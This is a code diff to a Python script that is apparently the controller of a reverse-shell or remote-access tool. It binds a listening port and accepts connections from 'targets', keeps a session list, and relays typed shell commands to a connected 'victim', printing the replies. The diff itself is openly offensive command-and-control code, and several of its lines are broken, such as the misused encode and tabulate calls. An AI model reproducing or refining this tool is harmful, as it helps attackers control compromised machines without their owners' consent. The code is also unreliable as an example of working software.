@@ -43,8 +43,8 @@ def connection_bind():
 		global s
 		print(f"\n  {c}[{g}+{c}] {v}binding connection to the port {r}>> {y}{port}")
 		s.bind((host , port))
-		s.listen(5)
 		print(f"\n  {c}[{g}!{c}] {g}binding was completed")
+		s.listen(5)
 	except socket.error as error:
 		print(f"  {c}[{r}-{c}] {y}Binding error {v}>> {r}{error}")
 		time.sleep(1)
@@ -56,7 +56,7 @@ def conection_accept():
 		i.close()
 	del all_connection[:]
 	del address_connection[:]
-	while True:
+	while 1:
 		try:
 			conn , address = s.accept()
 			conn.setblocking(1)
@@ -75,8 +75,12 @@ def intarface():
 		elif op_listen == "exit":
 			s.close()
 			sys.exit()
-		elif op_listen[0:] == "connect":
-			session_connect(op_listen)
+		elif "connect" in op_listen:
+			conns = session_connect(op_listen)
+			if conns is not None:
+				send_command(conns)
+		elif op_listen == "show session":
+			session_list()
 		elif op_listen == "help":
 			help_menu_session()
 		else:
@@ -86,50 +90,45 @@ def session_list():
 	result = ""
 	for i , conn in enumerate(address_connection):
 		try:
-			msg = ""
-			s.send(str(msg).encode("utf-8"))
+			s.send(str.encode("utf-8"))
 			s.recv(1024)
 		except socket.error as error:
 			del all_connection[i]
-			del address_connection[0]
-		result = f"{y}session number" + f"{y}IP",f"{y}PORT" + f"{r}{str(i)}" + f"{r}{address_connection[i][0]}" + f"{r}{address_connection[i][1]}"
-	print(tabulate(result, headers="firstrow",tablefmt="fancy_grid"))
-	#print(str(address_connection[i][0:]))
+			del address_connection[i]
+		result = f"{y}session number" + f"{y}IP",f"{y}PORT"
+		info = f"{r}{str(i)}" + f"{r}{address_connection[i][0]}" + f"{r}{address_connection[i][1]}"
+	print(tabulate(result, info,tablefmt="fancy_grid"))
+
 '''connecting to the targets'''
 def session_connect(op_listen):
 	try:
-		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0:])}")
+		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0])}")
 		time.sleep(1)
-		target = op_listen.replace("connect"," ")
+		target = op_listen.replace("connect ","")
 		target = int(target)
 		conn = all_connection[target]
 		time.sleep(2)
 		print(f"  {c}[{g}+{c}] {g} you are now connected to {v}>>{r} {address_connection[0]}",end="")
-	except s.error as error:
+		print(str(address_connection[0])+ f"{c}${r}> {g}")
+		return conn
+	except:
 		print(f"  {c}[{r}-{c}] {y}Could not to connect to  {v}>> {r}{address_connection[0]}")
+		return None
 '''sending commands to the victim'''
-def send_command():
+def send_command(conn):
 	while True:
 		try:
-			msg_command = input(f"  {c}${r}> {g}")
-			if msg_command == "quit session":
+			msg_comand = input(f" {c}$ {y}{str(address_connection[0])}{r}> {g}")
+			if len(str.encode(msg_comand)) > 0:
+				conn.send(str.encode(msg_comand))
+				target_response = str(conn.recv(20480), "utf-8")
+				print(target_response ,end="")
+			if msg_comand == "#exit":
 				break
-			if len(str.encode(msg_command)):
-				conn.send(str.encode(msg_command))
-				client_response = str(conn.recv(1024), "utf-8")
-				print(client_response, end="")
-				with open(img_name,"wb") as i :
-					while True:
-						bytes_reads = s.recv(1024)
-						if not bytes_reads:
-							break
-						i.write(bytes_reads)
-						i.close()
-						progress.update(len(bytes_reads))
-
 		except:
-			print(f"  {c}[{r}?{c}] {y}Connection lost to the target")
+			print(f" {c}[{r}-{c}] {y}the target is not connected{none}")
 			break
+
 '''creat some thread'''
 def workers():
 	for _ in range(NUMBER_OF_THREAD):
